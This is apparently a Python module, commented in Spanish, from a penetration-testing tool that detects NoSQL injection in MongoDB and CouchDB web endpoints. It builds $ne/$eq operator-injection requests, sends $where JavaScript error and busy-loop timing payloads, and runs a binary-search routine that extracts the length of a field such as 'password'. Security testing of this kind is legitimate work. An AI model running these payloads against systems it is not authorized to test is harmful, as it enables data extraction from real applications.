"""Módulo de detección de NoSQL Injection (MongoDB/CouchDB).

sqlmap NO soporta NoSQL — es exclusivamente un motor de SQL. Por eso
este módulo no delega a sqlmap: hace su propia detección multi-vector
y, cuando confirma una inyección de operador ciega, corre su propio
mini-motor de explotación (extracción de longitud por búsqueda binaria
vía $where) para probar explotabilidad real, no solo "posible SQLi".

Vectores cubiertos (los mismos que documenta OWASP/PortSwigger y que
implementa NoSQLMap para MongoDB, el motor NoSQL más común de lejos):

1. Operator injection vía notación de corchetes en query-string/form
   (`user[$ne]=1`) — el vector más común en la práctica porque
   frameworks como Express (con la librería `qs`) y PHP convierten
   automáticamente `a[$ne]=1` en `{a: {$ne: 1}}` sin que el
   desarrollador lo pida explícitamente.
2. Operator injection vía JSON body (`{"user": {"$ne": null}}`),
   cuando el endpoint acepta `Content-Type: application/json`.
3. $where injection (JavaScript embebido) — error-based (JS con
   error de sintaxis deliberado) y time-based (bucle ocupado real,
   ya que $where no tiene un sleep() nativo).
"""

import json
import time
from typing import Any, Optional

import requests

from inyector.utils.logger import get_logger
from inyector.utils.response_compare import responses_similar

logger = get_logger(__name__)


class NoSQLiDetector:
    """Detecta NoSQL injection (principalmente MongoDB) en un endpoint."""

    MONGO_ERROR_SIGNATURES = [
        "mongoerror", "mongoservererror", "mongonetworkerror",
        "bsonerror", "bsontypeerror", "casterror", "validationerror",
        "mongooseerror", "e11000 duplicate key",
        "mongodb\\driver\\exception", "com.mongodb.mongoexception",
        "pymongo.errors",
    ]

    COUCHDB_SIGNATURE_KEYS = {"couchdb", "version", "vendor"}

    # Payload de $where con error de sintaxis JS deliberado — cualquier
    # motor que evalúe esto como JavaScript va a tirar un error
    # reconocible (SyntaxError o el nombre del motor Mongo).
    WHERE_SYNTAX_ERROR_PAYLOAD = "this.a === this.a'"

    # Busy-loop real en JS — $where no tiene sleep() nativo, así que
    # el time-based blind se hace con una espera activa (técnica
    # documentada en OWASP Testing Guide para NoSQLi).
    @staticmethod
    def _where_busy_loop(seconds: int) -> str:
        ms = seconds * 1000
        return (
            f"function() {{ var d = new Date(); "
            f"do {{ var cur = new Date(); }} while (cur - d < {ms}); "
            f"return true; }}"
        )

    def fingerprint_engine(self, base_url: str,
                           session: requests.Session) -> dict:
        """Identifica el motor NoSQL detrás del target, si lo hay.

        Returns:
            Diccionario con engine ('mongodb' | 'couchdb' | 'unknown')
            y evidence.
        """
        resultado: dict[str, Any] = {"engine": "unknown", "confidence": 0.0, "evidence": []}

        try:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            root_url = f"{parsed.scheme}://{parsed.netloc}/"

            response = session.get(root_url, timeout=15)
            try:
                data = response.json()
                if isinstance(data, dict) and "couchdb" in data:
                    resultado.update({
                        "engine": "couchdb", "confidence": 0.95,
                        "evidence": [f"Banner CouchDB en '/': {data}"],
                    })
                    return resultado
            except (ValueError, json.JSONDecodeError):
                pass

            body_lower = response.text.lower()
            for sig in self.MONGO_ERROR_SIGNATURES:
                if sig in body_lower:
                    resultado.update({
                        "engine": "mongodb", "confidence": 0.6,
                        "evidence": [f"Firma MongoDB en respuesta: '{sig}'"],
                    })
                    return resultado

        except requests.exceptions.RequestException as e:
            logger.debug(f"Error al fingerprintear motor NoSQL: {e}")

        return resultado

    def detect_operator_injection(
        self, url: str, session: requests.Session,
        param: str, method: str = "GET",
        data: Optional[str] = None,
    ) -> dict:
        """Detecta operator injection ($ne/$gt) vía bracket-notation y JSON.

        La señal NO es comparar contra el baseline original — en un
        pentest real no sabemos si las credenciales del baseline son
        válidas, así que "el baseline tuvo éxito" no es un supuesto
        seguro. La señal real es más simple y no depende de eso: con
        el MISMO valor improbable, '$ne' (matchea cualquier cosa
        distinta) y '$eq' (matchea solo ese valor exacto) deberían
        comportarse EXACTAMENTE igual si la app trata el operador como
        texto plano (ninguno de los dos matchea nada real). Si en vez
        de eso se comportan distinto, es porque el operador se está
        interpretando como operador de Mongo — eso ya es la prueba.

        Args:
            url: URL objetivo.
            session: Sesión HTTP configurada.
            param: Parámetro a testear.
            method: GET o POST.
            data: Body original si el método es POST (form-encoded).

        Returns:
            Diccionario con vulnerable, vector, evidence y confidence.
        """
        resultado: dict[str, Any] = {
            "vulnerable": False, "vector": None,
            "confidence": 0.0, "evidence": [],
        }

        try:
            always_true = self._send(
                url, session, method, data, param,
                {"$ne": "inyector_valor_improbable_xyz"},
            )
            always_false = self._send(
                url, session, method, data, param,
                {"$eq": "inyector_valor_improbable_xyz"},
            )

            if always_true is None or always_false is None:
                return resultado

            if not self._responses_similar(always_true, always_false):
                resultado.update({
                    "vulnerable": True,
                    "vector": "bracket_notation" if "?" in url or method == "GET" else "json_body",
                    "confidence": 0.85,
                    "evidence": [
                        f"'{param}[$ne]=x' y '{param}[$eq]=x' (mismo valor "
                        f"improbable 'x') producen respuestas distintas — "
                        f"solo pasa si el operador se interpreta como "
                        f"operador de Mongo real, no como texto plano"
                    ],
                })

        except requests.exceptions.RequestException as e:
            logger.debug(f"Error en detección de operator injection: {e}")

        return resultado

    def detect_where_injection(self, url: str, session: requests.Session,
                               param: str) -> dict:
        """Detecta $where injection: error-based y time-based (busy-loop).

        Args:
            url: URL objetivo.
            session: Sesión HTTP configurada.
            param: Parámetro a mutar.

        Returns:
            Diccionario con vulnerable, technique, evidence, confidence.
        """
        resultado: dict[str, Any] = {
            "vulnerable": False, "technique": None,
            "confidence": 0.0, "evidence": [],
        }

        from inyector.utils.url_probe import build_probe_url

        # 1. Error-based: JS con error de sintaxis deliberado
        try:
            error_url = build_probe_url(
                url, param, self.WHERE_SYNTAX_ERROR_PAYLOAD,
                fallback_name="nosqli_test",
            )
            response = session.get(error_url, timeout=15)
            body_lower = response.text.lower()
            for sig in self.MONGO_ERROR_SIGNATURES + ["syntaxerror"]:
                if sig in body_lower:
                    resultado.update({
                        "vulnerable": True, "technique": "where_error_based",
                        "confidence": 0.8,
                        "evidence": [f"Error de motor JS/Mongo con payload $where: '{sig}'"],
                    })
                    return resultado
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error en $where error-based: {e}")

        # 2. Time-based: busy-loop real (no hay sleep() nativo en $where)
        try:
            baseline_start = time.time()
            session.get(url, timeout=15)
            baseline_elapsed = time.time() - baseline_start

            delay_url = build_probe_url(
                url, param, self._where_busy_loop(4),
                fallback_name="nosqli_test",
            )
            delayed_start = time.time()
            session.get(delay_url, timeout=20)
            delayed_elapsed = time.time() - delayed_start

            if delayed_elapsed > baseline_elapsed + 3:
                resultado.update({
                    "vulnerable": True, "technique": "where_time_based",
                    "confidence": 0.75,
                    "evidence": [
                        f"Busy-loop de 4s en $where retrasó la respuesta "
                        f"{delayed_elapsed:.1f}s vs baseline {baseline_elapsed:.1f}s"
                    ],
                })
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error en $where time-based: {e}")

        return resultado

    def extract_field_length(
        self, url: str, session: requests.Session,
        param: str, target_field: str, max_length: int = 64,
    ) -> Optional[int]:
        """PoC de explotación real: extrae la longitud de un campo por
        búsqueda binaria vía $where — sqlmap no puede hacer esto para
        NoSQL, así que es nuestro propio mini-motor de explotación.

        Args:
            url: URL objetivo (ya confirmada vulnerable a $where).
            session: Sesión HTTP configurada.
            param: Parámetro inyectable.
            target_field: Nombre del campo Mongo a medir (ej. 'password').
            max_length: Cota superior de la búsqueda binaria.

        Returns:
            Longitud del campo, o None si no se pudo determinar.
        """
        from inyector.utils.url_probe import build_probe_url

        def _is_length_gt(n: int) -> Optional[bool]:
            payload = (
                f"function() {{ return this.{target_field} && "
                f"this.{target_field}.length > {n}; }}"
            )
            test_url = build_probe_url(
                url, param, payload, fallback_name="nosqli_test",
            )
            try:
                baseline_url = build_probe_url(
                    url, param,
                    "function() { return true; }",
                    fallback_name="nosqli_test",
                )
                baseline = self._send_raw(baseline_url, session)
                candidate = self._send_raw(test_url, session)
                if baseline is None or candidate is None:
                    return None
                return not self._responses_similar(baseline, candidate)
            except requests.exceptions.RequestException:
                return None

        low, high = 0, max_length
        while low < high:
            mid = (low + high) // 2
            is_greater = _is_length_gt(mid)
            if is_greater is None:
                logger.warning(
                    "No se pudo confirmar respuesta durante extracción — abortando"
                )
                return None
            if is_greater:
                low = mid + 1
            else:
                high = mid

        return low

    # ── Helpers internos ──────────────────────────────────────────

    def _send(self, url, session, method, data, param, operator_value):
        """Manda la variante GET (bracket-notation) o POST (JSON body)
        del payload de operador, según el método del endpoint."""
        if method.upper() == "GET":
            if operator_value is None:
                test_url = url
            else:
                op_name, op_val = next(iter(operator_value.items()))
                # OJO: hay que REEMPLAZAR 'param=...' si ya existe en la
                # URL, no solo agregar 'param[$op]=...' al lado — dejar
                # ambos genera una query ambigua que qs/Express puede
                # parsear de forma impredecible (bug real encontrado
                # probando contra un lab real).
                test_url = self._replace_param_with_operator(
                    url, param, op_name, op_val,
                )
            return self._send_raw(test_url, session)

        # POST: intentamos JSON body
        try:
            body = json.loads(data) if data else {}
        except (TypeError, ValueError):
            body = {}
        if operator_value is not None:
            body[param] = operator_value
        else:
            body.setdefault(param, "inyector_baseline")

        try:
            response = session.post(url, json=body, timeout=15)
            return response
        except requests.exceptions.RequestException:
            return None

    def _replace_param_with_operator(self, url, param, op_name, op_val):
        """Reemplaza 'param=valor' por 'param[$op]=valor' en la query
        string, en vez de dejar ambos presentes a la vez."""
        if "?" not in url:
            return f"{url}?{param}[{op_name}]={op_val}"

        base, _, query = url.partition("?")
        new_params = []
        replaced = False
        for pair in query.split("&"):
            key = pair.split("=", 1)[0]
            if key == param:
                new_params.append(f"{param}[{op_name}]={op_val}")
                replaced = True
            else:
                new_params.append(pair)
        if not replaced:
            new_params.append(f"{param}[{op_name}]={op_val}")
        return f"{base}?{'&'.join(new_params)}"

    def _send_raw(self, url, session):
        try:
            return session.get(url, timeout=15)
        except requests.exceptions.RequestException:
            return None

    def _responses_similar(self, resp_a, resp_b) -> bool:
        """Compara dos respuestas HTTP de forma tolerante — ver
        inyector.utils.response_compare (compartido con AIAssistant)."""
        return responses_similar(resp_a, resp_b)
